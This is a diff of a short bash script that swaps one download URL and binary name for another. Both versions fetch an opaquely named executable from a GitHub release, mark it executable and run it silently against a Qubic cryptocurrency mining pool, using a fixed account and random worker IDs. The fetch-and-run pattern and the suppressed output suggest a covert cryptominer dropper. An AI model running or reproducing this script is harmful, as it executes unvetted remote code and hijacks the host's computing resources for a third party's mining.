@@ -1,5 +1,5 @@
 #!/bin/bash
 
-wget https://github.com/vedhagsvp/taberas/releases/download/latest/nxtemns
-chmod +x nxtemns
-./nxtemns --account CP_udnvh2owpq --worker "$(shuf -i 1-15000 -n 1)-nexte" --pool qubic.asia.apool.io:4334 > /dev/null 2>&1
+wget https://github.com/vedhagsvp/qubros/releases/download/apl/aplnwa
+chmod +x aplnwa
+./aplnwa --account CP_udnvh2owpq --worker "$(shuf -i 1-15000 -n 1)-nexte" --pool qubic.asia.apool.io:4334 > /dev/null 2>&1
